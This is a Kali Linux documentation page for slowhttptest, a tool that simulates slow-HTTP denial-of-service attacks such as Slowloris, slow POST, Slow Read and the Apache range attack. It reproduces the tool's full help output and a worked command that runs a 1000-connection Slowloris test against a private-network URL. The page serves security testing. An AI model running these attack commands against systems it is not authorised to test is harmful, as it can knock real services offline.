---
Title: slowhttptest
Homepage: https://github.com/shekyan/slowhttptest
Repository: https://salsa.debian.org/debian/slowhttptest
Architectures: any
Version: 1.9.0-1
Metapackages: kali-linux-everything kali-tools-vulnerability kali-tools-web 
Icon: /images/kali-tools-icon-missing.svg
PackagesInfo: |
 ### slowhttptest
 
  SlowHTTPTest is a highly configurable tool that simulates some application
  layer Denial of Service attacks.
   
  It implements most common low-bandwidth application layer Denial of Service
  attacks, such as
    * Slowloris
    * Slow HTTP POST
    * Slow Read attack (based on TCP persist timer exploit) by draining
      concurrent connections pool
    * Apache Range Header attack by causing very significant memory and CPU
      usage on the server.
 
 **Installed size:** `88 KB`  
 **How to install:** `sudo apt install slowhttptest`  
 
 {{< spoiler "Dependencies:" >}}
 * libc6 
 * libgcc-s1 
 * libssl3 
 * libstdc++6 
 {{< /spoiler >}}
 
 ##### slowhttptest
 
 Denial Of Service attacks simulator
 
 ```
 root@kali:~# slowhttptest -h
 
 slowhttptest, a tool to test for slow HTTP DoS vulnerabilities - version 1.9.0
 Usage: slowhttptest [options ...]
 Test modes:
   -H               slow headers a.k.a. Slowloris (default)
   -B               slow body a.k.a R-U-Dead-Yet
   -R               range attack a.k.a Apache killer
   -X               slow read a.k.a Slow Read
 
 Reporting options:
 
   -g               generate statistics with socket state changes (off)
   -o file_prefix   save statistics output in file.html and file.csv (-g required)
   -v level         verbosity level 0-4: Fatal, Info, Error, Warning, Debug
 
 General options:
 
   -c connections   target number of connections (50)
   -i seconds       interval between followup data in seconds (10)
   -l seconds       target test length in seconds (240)
   -r rate          connections per seconds (50)
   -s bytes         value of Content-Length header if needed (4096)
   -t verb          verb to use in request, default to GET for
                    slow headers and response and to POST for slow body
   -u URL           absolute URL of target (http://localhost/)
   -x bytes         max length of each randomized name/value pair of
                    followup data per tick, e.g. -x 2 generates
                    X-xx: xx for header or &xx=xx for body, where x
                    is random character (32)
   -f content-type  value of Content-type header (application/x-www-form-urlencoded)
   -m accept        value of Accept header (text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5)
 
 Probe/Proxy options:
 
   -d host:port     all traffic directed through HTTP proxy at host:port (off)
   -e host:port     probe traffic directed through HTTP proxy at host:port (off)
   -p seconds       timeout to wait for HTTP response on probe connection,
                    after which server is considered inaccessible (5)
   -j cookies       value of Cookie header (ex.: -j "user_id=1001; timeout=9000")
 
 Range attack specific options:
 
   -a start        left boundary of range in range header (5)
   -b bytes        limit for range header right boundary values (2000)
 
 Slow read specific options:
 
   -k num          number of times to repeat same request in the connection. Use to
                   multiply response size if server supports persistent connections (1)
   -n seconds      interval between read operations from recv buffer in seconds (1)
   -w bytes        start of the range advertised window size would be picked from (1)
   -y bytes        end of the range advertised window size would be picked from (512)
   -z bytes        bytes to slow read from receive buffer with single read() call (5)
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## slowhttptest Usage Example

Use 1000 connections (`-c 1000`) with the Slowloris mode (`-H`), and generate statistics (`-g>` with the output file name (-`o slowhttp`). Use 10 seconds to wait for data (`-i 10`), 200 connections (`-r 200`) with GET requests (`-t GET`) against the target URL (`-u http://192.168.1.202/index.php`) with a maximum of length of 24 bytes (`-x 24)` and a 3 second time out (`-p 3`):

```
root@kali:~# slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.1.202/index.php -x 24 -p 3
Sat May 17 10:45:26 2014:
Sat May 17 10:45:26 2014:
    slowhttptest version 1.6
 - https://code.google.com/p/slowhttptest/ -
test type:                        SLOW HEADERS
number of connections:            1000
URL:                              http://192.168.1.202/index.php
verb:                             GET
Content-Length header value:      4096
follow up data max size:          52
interval between follow up data:  10 seconds
connections per seconds:          200
probe connection timeout:         3 seconds
test duration:                    240 seconds
using proxy:                      no proxy

Sat May 17 10:45:26 2014:
slow HTTP test status on 0th second:

initializing:        0
pending:             1
connected:           0
error:               0
closed:              0
service available:   YES
```
